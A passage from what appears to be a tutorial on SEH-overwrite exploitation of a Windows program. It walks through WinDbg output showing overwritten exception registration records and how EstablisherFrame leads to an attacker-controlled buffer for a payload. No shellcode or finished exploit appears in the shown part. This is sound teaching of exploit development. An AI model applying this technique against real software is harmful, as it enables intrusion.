</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">7731622</span>c esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">464</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">528</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">0</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">7731622</span>c esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">464</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">528</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
</span></span></code></pre></div><p>Once the breakpoint to the second exception handler has been triggered, let&rsquo;s inspect EIP to see more about this function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> u <span style="color:#960050;background-color:#1e0010">@</span>eip L11
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>c <span style="color:#ae81ff">55</span>              push    ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622</span>d <span style="color:#ae81ff">8</span>bec            mov     ebp,esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731622f</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316232</span> <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316233</span> <span style="color:#ae81ff">64ff</span><span style="color:#ae81ff">3500000000</span>  push    dword ptr fs:[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731623</span>a <span style="color:#ae81ff">64892500000000</span>  mov     dword ptr fs:[<span style="color:#ae81ff">0</span>],esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316241</span> ff7514          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316244</span> ff7510          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316247</span> ff750c          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>a ff7508          push    dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>d <span style="color:#ae81ff">8</span>b4d18          mov     ecx,dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx <span style="color:#75715e">// This ends calling 0x41414141, our handler function! 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">77316252</span> <span style="color:#ae81ff">648</span>b2500000000  mov     esp,dword ptr fs:[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316259</span> <span style="color:#ae81ff">648f</span><span style="color:#ae81ff">0500000000</span>  pop     dword ptr fs:[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316260</span> <span style="color:#ae81ff">8</span>be5            mov     esp,ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316262</span> <span style="color:#ae81ff">5</span>d              pop     ebp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316263</span> c21400          ret     <span style="color:#ae81ff">14</span>h
</span></span></code></pre></div><p>The first thing worth mentioning in this code is that we are about to invoke a function by executing a “call ecx” instruction.
According to the call stack that we say previously, after the call to ExecuteHandler2, we call the overwritten <code>_except_handler</code> function (0x41414141). Additionally, this function accepts four arguments as inferred from the four PUSH instructions preceding the “call ecx”. This matches the <code>_except_handler</code> function prototype, which is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) (
</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord, 
</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame, 
</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord, 
</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
</span></span></code></pre></div><p>If we analyze more in depth this function, we can see that the &ldquo;ExceptionList&rdquo; pointer of the TEB is being updated with a new <code>_EXCEPTION_REGISTRATION_RECORD</code>structure, in order to manage exceptions that might occur during the call of the <code>_except_handler</code> function.
If we continue the execution of the function, we can see that, after updating the TEB, the &ldquo;call&rdquo; instruction is being performed to our controlled address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">6f</span>db73da edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">7731624</span>d esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x21</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7731624</span>d <span style="color:#ae81ff">8</span>b4d18          mov     ecx,dword ptr [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h] ss:<span style="color:#ae81ff">0023</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">478</span><span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77316250</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx {<span style="color:#ae81ff">41414141</span>}
</span></span></code></pre></div><p>Once we have understood how to redirect code execution, we need to make it point to our payload.
During a vanilla stack overflow, the attacker overwrites a return address, and consequently the EIP register, with the address of an instruction (like “jmp esp”) that can redirect the execution flow to the stack, where a payload is stored.
However, in this scenario we <strong>do not control the stack when we gain control of the instruction pointer</strong>. Let&rsquo;s inspect ESP when we change the EIP:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77316270</span> esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77316250</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span> ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x24</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77316250</span> ffd1            call    ecx {<span style="color:#ae81ff">41414141</span>}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dds esp L8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">444</span>  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">540</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">448</span>  <span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">44</span>c  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">55</span>c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">450</span>  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">4</span>cc
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">454</span>  <span style="color:#ae81ff">0175f</span>e0c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">458</span>  <span style="color:#ae81ff">77316270</span> ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">45</span>c  <span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">460</span>  <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">528</span>
</span></span></code></pre></div><p>But let&rsquo;s inspect the four argument passed to the <code>_except_handler</code> function before calling it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> EXCEPTION_DISPOSITION <span style="color:#a6e22e">_except_handler</span> (<span style="color:#f92672">*</span>PEXCEPTION_ROUTINE) (
</span></span><span style="display:flex;"><span>IN PEXCEPTION_RECORD ExceptionRecord, 
</span></span><span style="display:flex;"><span>IN VOID EstablisherFrame, 
</span></span><span style="display:flex;"><span>IN OUT PCONTEXT ContextRecord, 
</span></span><span style="display:flex;"><span>IN OUT PDISPATCHER_CONTEXT DispatcherContext );
</span></span></code></pre></div><p>The argument of interest is the <strong>EstablisherFrame</strong> argument, which is a pointer to the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure used to handle the exception. Remember we managed to overwrite the two parameters of this structure!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090f</span>e0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0090ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x1008df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">007</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0090ff</span><span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x41414141</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>So if we managed to overwrite this structure, let&rsquo;s inspect how many bytes we managed to overwrite starting from such structure&rsquo;s address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">002</span><span style="color:#ae81ff">86000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">454</span>
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01760000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0175e000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">002</span><span style="color:#ae81ff">86000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000016</span>cc . <span style="color:#ae81ff">00000f</span><span style="color:#ae81ff">30</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0050</span>a108
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0027</span><span style="color:#ae81ff">9000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0175f</span><span style="color:#ae81ff">454</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0175fe0c</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77316270</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0x0175fe0c</span> 
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0175ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0094df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0x0175ff44</span> 
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x41414141</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x41414141</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0x0175ff44</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">58</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">64</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">68</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">6</span>c  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">70</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">74</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">78</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">7</span>c  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">84</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">88</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">8</span>c  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">90</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">94</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">98</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span><span style="color:#ae81ff">9</span>c  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>a0  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>a4  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>a8  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>ac  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>b0  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>b4  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>b8  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>bc  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0175ff</span>c0  <span style="color:#ae81ff">41414141</span>
</span></span></code></pre></div><p>As we can see, the pointer to our <code>_EXCEPTION_REGISTRATION_RECORD</code> stores an address to where our payload is located! We did not only override those bytes, but more bytes!
So the same buffer that we used to overwrite the <code>_EXCEPTION_REGISTRATION_RECORD</code> to modify the EIP is the same that we will use to store our payload.</p>
<p>Let&rsquo;s locate the section where we put the parameters of ExecuteHandler2 to see where our paramter of interest is located:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">010</span><span style="color:#f92672">&gt;</span> u <span style="color:#960050;background-color:#1e0010">@</span>eip L11
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2:
